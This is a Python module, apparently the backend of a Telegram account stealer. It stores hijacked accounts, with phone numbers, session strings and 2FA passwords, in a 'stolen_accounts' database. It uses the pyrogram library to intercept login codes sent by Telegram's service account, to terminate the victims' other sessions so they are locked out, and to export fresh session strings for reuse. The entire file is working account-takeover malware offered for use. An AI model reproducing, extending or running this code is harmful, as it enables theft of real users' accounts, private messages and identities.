# -*- coding: utf-8 -*-
import sqlite3, time, re, asyncio, logging
from datetime import datetime
log = logging.getLogger("stealer")
DB_PATH = "stealer.db"
_interceptors = {}

def _conn():
    return sqlite3.connect(DB_PATH)

def init_db():
    with _conn() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS stolen_accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT, session_string TEXT, password_2fa TEXT DEFAULT '',
            first_name TEXT DEFAULT '', username TEXT DEFAULT '',
            tg_id INTEGER DEFAULT 0, api_id INTEGER DEFAULT 0,
            api_hash TEXT DEFAULT '', created_at TEXT, last_session TEXT)""")
        c.execute("CREATE INDEX IF NOT EXISTS idx_phone ON stolen_accounts(phone)")

def save_account(phone, session_string, password_2fa="", first_name="",
                 username="", tg_id=0, api_id=0, api_hash=""):
    now = datetime.now().isoformat(timespec="seconds")
    with _conn() as c:
        ex = c.execute("SELECT id FROM stolen_accounts WHERE phone=?", (phone,)).fetchone()
        if ex:
            c.execute("""UPDATE stolen_accounts SET session_string=?,password_2fa=?,
                first_name=?,username=?,tg_id=?,api_id=?,api_hash=?,last_session=?
                WHERE phone=?""", (session_string, password_2fa, first_name, username,
                tg_id, api_id, api_hash, now, phone))
            return ex[0]
        cur = c.execute("""INSERT INTO stolen_accounts (phone,session_string,password_2fa,
            first_name,username,tg_id,api_id,api_hash,created_at,last_session)
            VALUES (?,?,?,?,?,?,?,?,?,?)""", (phone, session_string, password_2fa,
            first_name, username, tg_id, api_id, api_hash, now, now))
        return cur.lastrowid

def get_all_accounts():
    with _conn() as c:
        c.row_factory = sqlite3.Row
        return [dict(r) for r in c.execute("SELECT * FROM stolen_accounts ORDER BY id DESC").fetchall()]

def get_account_by_id(acc_id):
    with _conn() as c:
        c.row_factory = sqlite3.Row
        row = c.execute("SELECT * FROM stolen_accounts WHERE id=?", (acc_id,)).fetchone()
        return dict(row) if row else None

def delete_account(acc_id):
    with _conn() as c:
        c.execute("DELETE FROM stolen_accounts WHERE id=?", (acc_id,))

async def start_interceptor(acc_id):
    from pyrogram import Client, filters
    acc = get_account_by_id(acc_id)
    if not acc:
        return None
    phone = acc["phone"]
    if phone in _interceptors:
        await stop_interceptor(phone)
    app = Client("int_%d_%d" % (acc_id, int(time.time())),
        api_id=acc["api_id"] or 2040,
        api_hash=acc["api_hash"] or "b18441a1ff607e10a989891a5462e627",
        session_string=acc["session_string"], in_memory=True)
    try:
        await app.connect()
    except Exception as e:
        log.error("interceptor connect fail: %s", e)
        return None
    code_event = asyncio.Event()
    caught = [None]
    @app.on_message(filters.user(777000) & filters.private)
    async def on_tel_msg(client, message):
        text = message.text or message.caption or ""
        clean = text.replace(" ", "").replace("-", "")
        codes = re.findall(r"(?:^|\D)(\d{4,7})(?:\D|$)", clean)
        if codes:
            caught[0] = max(codes, key=len)
            code_event.set()
            log.info("[%s] CODE: %s", phone, caught[0])
        spaced = re.findall(r"(?:^|\s)(\d\s?\d\s?\d\s?\d\s?\d)(?:\s|$)", text)
        if spaced and not caught[0]:
            caught[0] = spaced[0].replace(" ", "")
            code_event.set()
    _interceptors[phone] = {"app": app, "event": code_event, "caught": caught}
    log.info("[%s] interceptor started", phone)
    return app

async def stop_interceptor(phone):
    data = _interceptors.pop(phone, None)
    if data:
        try:
            await data["app"].stop()
        except:
            pass

async def wait_for_code(phone, timeout=120):
    data = _interceptors.get(phone)
    if not data:
        return None
    try:
        await asyncio.wait_for(data["event"].wait(), timeout=timeout)
        return data["caught"][0]
    except asyncio.TimeoutError:
        return None

async def kill_sessions_async(acc_id=None):
    from pyrogram import Client
    from pyrogram.raw.functions.account import GetAuthorizations, ResetAuthorization
    accounts = [get_account_by_id(acc_id)] if acc_id else get_all_accounts()
    accounts = [a for a in accounts if a]
    killed = []
    for acc in accounts:
        app = Client("kill_%d" % acc["id"], api_id=acc["api_id"] or 2040,
            api_hash=acc["api_hash"] or "b18441a1ff607e10a989891a5462e627",
            session_string=acc["session_string"], in_memory=True)
        try:
            await app.connect()
            result = await app.invoke(GetAuthorizations())
            for auth in getattr(result, "authorizations", []):
                if not getattr(auth, "current", False):
                    try:
                        await app.invoke(ResetAuthorization(hash=auth.hash))
                        name = getattr(auth, "app_name", "?") or getattr(auth, "device_model", "?")
                        killed.append("%s — %s" % (acc["phone"], name))
                    except Exception as e:
                        killed.append("%s — err: %s" % (acc["phone"], str(e)[:30]))
            await app.stop()
        except Exception as e:
            killed.append("%s — conn: %s" % (acc["phone"], str(e)[:40]))
    return killed

async def export_sessions(acc_id):
    from pyrogram import Client
    acc = get_account_by_id(acc_id)
    if not acc:
        return None, None
    app = Client("exp_%d_%d" % (acc_id, int(time.time())),
        api_id=acc["api_id"] or 2040,
        api_hash=acc["api_hash"] or "b18441a1ff607e10a989891a5462e627",
        session_string=acc["session_string"], in_memory=True)
    try:
        await app.connect()
        fresh_ss = await app.export_session_string()
        now = datetime.now().isoformat(timespec="seconds")
        with _conn() as c:
            c.execute("UPDATE stolen_accounts SET session_string=?,last_session=? WHERE id=?",
                      (fresh_ss, now, acc_id))
        dc_options = {1:("149.154.175.50",443),2:("149.154.167.50",443),
                      3:("149.154.175.100",443),4:("149.154.167.91",443),5:("149.154.171.5",443)}
        dc_id = 2
        server, port = dc_options.get(dc_id, ("149.154.167.50", 443))
        try:
            storage = app.storage
            dc_id = getattr(storage, "dc_id", 2)
            server, port = dc_options.get(dc_id, ("149.154.167.50", 443))
        except:
            pass
        tdata = {"dc_id": dc_id, "server_address": server, "port": port,
                 "auth_key": fresh_ss.split("|")[-1] if "|" in fresh_ss else "see_session_string",
                 "takeout_id": None, "id": acc["tg_id"], "bot": False}
        await app.stop()
        return fresh_ss, tdata
    except Exception as e:
        log.error("export fail: %s", e)
        try:
            await app.stop()
        except:
            pass
        return None, None